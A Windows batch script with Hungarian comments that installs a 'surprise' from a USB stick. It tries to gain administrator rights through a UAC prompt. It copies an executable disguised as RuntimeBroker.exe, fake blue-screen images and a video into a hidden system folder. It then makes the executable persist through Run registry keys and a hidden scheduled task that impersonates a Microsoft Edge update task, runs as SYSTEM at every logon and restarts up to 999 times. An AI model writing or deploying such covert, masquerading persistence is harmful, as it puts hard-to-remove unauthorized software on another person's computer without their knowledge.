@echo off
:: ================================================================
::  dani-meglepi -- Deploy szkript v4
::  Admin mód:   SYSTEM Task, HKCU+HKLM registry, rejtett mappa
::  User mód:    User Task,   HKCU registry
:: ================================================================
setlocal EnableDelayedExpansion

set "ASSET_DIR=C:\Users\Public\dani-meglepi"
set "EXE_NAME=RuntimeBroker.exe"
set "TASK_NAME=MicrosoftEdgeUpdateTaskMachineCore"

:: SRC = szkript saját könyvtára (pendrive gyökere)
set "SRC=%~dp0"
if "%SRC:~-1%"=="\" set "SRC=%SRC:~0,-1%"

:: ── Argumentum alapján meghatározzuk a módot ─────────────────────
:: Lehetséges argumentumok:
::   (üres)   = első futás, nincs még eldöntve
::   ADMIN    = admin jogon újraindítva
::   USER     = UAC visszautasítva, user módban folytatjuk
::   ELEVATED = régi kompatibilitás

set "MODE=%~1"
if /i "!MODE!"=="ADMIN"    goto :run_admin
if /i "!MODE!"=="USER"     goto :run_user
if /i "!MODE!"=="ELEVATED" goto :run_admin

:: ── Első futás: admin jog ellenőrzés ────────────────────────────
net session >nul 2>&1
if !errorlevel! equ 0 (
    :: Már admin jogon vagyunk
    goto :run_admin
)

:: Nincs admin jog — UAC kísérlet
:: PowerShell-lel próbálunk admin jogot szerezni.
:: Ha sikerül: ADMIN módban újraindul.
:: Ha a user elutasítja / nem sikerül: USER módban folytatjuk.
echo.
echo  ============================================
echo   dani-meglepi telepito
echo  ============================================
echo.
echo [INFO] Admin jog szukseges a teljes telepiteshez.
echo        Ha az UAC ablakban a "Nem" gombot nyomja,
echo        a telepites egyszerusitett modban folytatodik.
echo.
timeout /t 2 /nobreak >nul

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "try { Start-Process cmd.exe -ArgumentList '/c \"%~f0\" ADMIN' -Verb RunAs -Wait; exit 0 } catch { exit 1 }" >nul 2>&1

if !errorlevel! equ 0 (
    :: Admin ablak lefutott (akár sikerrel, akár nem — az ő feladata volt)
    exit /b 0
)

:: PowerShell maga hibázott (pl. policy tiltja) → user mód
goto :run_user

:: ================================================================
:run_admin
:: ================================================================
echo.
echo  ============================================
echo   dani-meglepi telepito  [ADMIN mod]
echo  ============================================
echo.

:: SRC újrabeállítás ADMIN újraindítás esetén
:: (a runas megtartja az argumentumban lévő szkript elérési útját)
set "SRC=%~dp0"
if "!SRC:~-1!"=="\" set "SRC=!SRC:~0,-1!"

call :step_mkdir
if !errorlevel! neq 0 goto :fail_admin

:: Mappa elrejtése
echo [2/5] Mappa elrejtese...
attrib +H +S "%ASSET_DIR%" >nul 2>&1
if errorlevel 1 (
    echo   FIGYELEM: Nem sikerult elrejteni ^(nem vegzetes^).
) else (
    echo   OK: Rejtett + rendszer attributum.
)

call :step_copy
if !errorlevel! neq 0 goto :fail_admin

:: Registry: HKCU + HKLM
echo.
echo [4/5] Registry...
call :reg_hkcu
call :reg_hklm
echo   OK: HKCU\Run + HKLM\Run

:: Task Scheduler: SYSTEM szintű, minden felhasználóra
echo.
echo [5/5] Task Scheduler - SYSTEM...
call :task_system
if !errorlevel! neq 0 (
    echo   FIGYELEM: SYSTEM task sikertelen, user task probalkozas...
    call :task_user
)

call :step_launch

echo.
echo  ============================================
echo   Telepites KESZ!  [ADMIN mod]
echo   Hely    : %ASSET_DIR% ^(rejtett^)
echo   Registry: HKCU + HKLM
echo   Task    : SYSTEM, minden felhasznalora
echo  ============================================
echo.
timeout /t 5 /nobreak >nul
exit /b 0

:fail_admin
echo.
echo  ============================================
echo   ADMIN TELEPITES SIKERTELEN
echo  ============================================
echo.
pause
exit /b 1

:: ================================================================
:run_user
:: ================================================================
echo.
echo  ============================================
echo   dani-meglepi telepito  [USER mod]
echo  ============================================
echo.

call :step_mkdir
if !errorlevel! neq 0 goto :fail_user

:: Mappa elrejtése — attrib user módban is működik NTFS-en
echo [2/5] Mappa elrejtese...
attrib +H "%ASSET_DIR%" >nul 2>&1
if errorlevel 1 (
    echo   FIGYELEM: Nem sikerult ^(nem vegzetes^).
) else (
    echo   OK: Rejtett attributum beallitva.
)

call :step_copy
if !errorlevel! neq 0 goto :fail_user

:: Registry: csak HKCU
echo.
echo [4/5] Registry...
call :reg_hkcu
echo   OK: HKCU\Run

:: Task Scheduler: user szintű
echo.
echo [5/5] Task Scheduler - user szintu...
call :task_user
if !errorlevel! neq 0 (
    echo   FIGYELEM: Task nem sikerult ^(Registry elegendo^).
)

call :step_launch

echo.
echo  ============================================
echo   Telepites KESZ!  [USER mod]
echo   Hely    : %ASSET_DIR%
echo   Registry: HKCU
echo   Task    : Felhasznaloi szintu ^(%USERDOMAIN%\%USERNAME%^)
echo   Megj.   : HID letiltas admin nelkul nem elerheto
echo  ============================================
echo.
timeout /t 5 /nobreak >nul
exit /b 0

:fail_user
echo.
echo  ============================================
echo   USER TELEPITES SIKERTELEN
echo  ============================================
echo.
pause
exit /b 1

:: ================================================================
:: Közös lépések (subroutine-ok)
:: ================================================================

:step_mkdir
echo [1/5] Konyvtar: %ASSET_DIR%
if not exist "%ASSET_DIR%" (
    mkdir "%ASSET_DIR%" 2>nul
    if errorlevel 1 ( echo   HIBA: Nem sikerult letrehozni! & exit /b 1 )
    echo   Letrehozva.
) else (
    echo   Mar letezik.
)
exit /b 0

:step_copy
echo.
echo [3/5] Fajlok masolasa...
set "FILES=%EXE_NAME% bsod_800x600.png bsod_1024x768.png bsod_1152x864.png bsod_1280x1024.png bsod_1600x1200.png daninak.mp4"
set "_MISS="
for %%F in (%FILES%) do (
    if not exist "!SRC!\%%F" (
        echo   HIANYZIK: %%F
        set "_MISS=1"
    )
)
if defined _MISS (
    echo.
    echo   Pendrive-on szukseges fajlok: %FILES%
    exit /b 1
)
for %%F in (%FILES%) do (
    copy /Y "!SRC!\%%F" "%ASSET_DIR%\%%F" >nul
    if errorlevel 1 ( echo   HIBA: %%F & exit /b 1 )
    echo   OK: %%F
)
exit /b 0

:step_launch
echo.
echo [+] Program inditasa...
start "" /B "%ASSET_DIR%\%EXE_NAME%"
echo   OK: RuntimeBroker.exe elinditva.
exit /b 0

:reg_hkcu
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "RuntimeBrokerSvc" /t REG_SZ ^
    /d "\"%ASSET_DIR%\%EXE_NAME%\"" /f >nul 2>&1
exit /b 0

:reg_hklm
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "RuntimeBrokerSvc" /t REG_SZ ^
    /d "\"%ASSET_DIR%\%EXE_NAME%\"" /f >nul 2>&1
exit /b 0

:task_system
set "_TXML=%TEMP%\dm_task_%RANDOM%.xml"
(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Author^>Microsoft Corporation^</Author^>
echo     ^<Description^>Keeps the Microsoft Edge Update Task running.^</Description^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>^<LogonTrigger^>^<Enabled^>true^</Enabled^>^</LogonTrigger^>^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>S-1-5-18^</UserId^>
echo       ^<LogonType^>ServiceAccount^</LogonType^>
echo       ^<RunLevel^>HighestAvailable^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RestartOnFailure^>^<Interval^>PT1M^</Interval^>^<Count^>999^</Count^>^</RestartOnFailure^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>^<StopOnIdleEnd^>false^</StopOnIdleEnd^>^<RestartOnIdle^>false^</RestartOnIdle^>^</IdleSettings^>
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>"%ASSET_DIR%\%EXE_NAME%"^</Command^>
echo       ^<WorkingDirectory^>%ASSET_DIR%^</WorkingDirectory^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) > "!_TXML!"
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /create /xml "!_TXML!" /tn "%TASK_NAME%" /f >nul 2>&1
set "_ERR=!errorlevel!"
del "!_TXML!" >nul 2>&1
if !_ERR! equ 0 ( echo   OK: SYSTEM task regisztralva. )
exit /b !_ERR!

:task_user
set "_TXML=%TEMP%\dm_task_%RANDOM%.xml"
set "_CU=%USERDOMAIN%\%USERNAME%"
(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Author^>Microsoft Corporation^</Author^>
echo     ^<Description^>Keeps the Microsoft Edge Update Task running.^</Description^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>^<LogonTrigger^>^<Enabled^>true^</Enabled^>^<UserId^>!_CU!^</UserId^>^</LogonTrigger^>^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>!_CU!^</UserId^>
echo       ^<LogonType^>InteractiveToken^</LogonType^>
echo       ^<RunLevel^>LeastPrivilege^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RestartOnFailure^>^<Interval^>PT1M^</Interval^>^<Count^>999^</Count^>^</RestartOnFailure^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>^<StopOnIdleEnd^>false^</StopOnIdleEnd^>^<RestartOnIdle^>false^</RestartOnIdle^>^</IdleSettings^>
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>"%ASSET_DIR%\%EXE_NAME%"^</Command^>
echo       ^<WorkingDirectory^>%ASSET_DIR%^</WorkingDirectory^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) > "!_TXML!"
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /create /xml "!_TXML!" /tn "%TASK_NAME%" /f >nul 2>&1
set "_ERR=!errorlevel!"
del "!_TXML!" >nul 2>&1
if !_ERR! equ 0 ( echo   OK: User task regisztralva ^(!_CU!^). )
exit /b !_ERR!
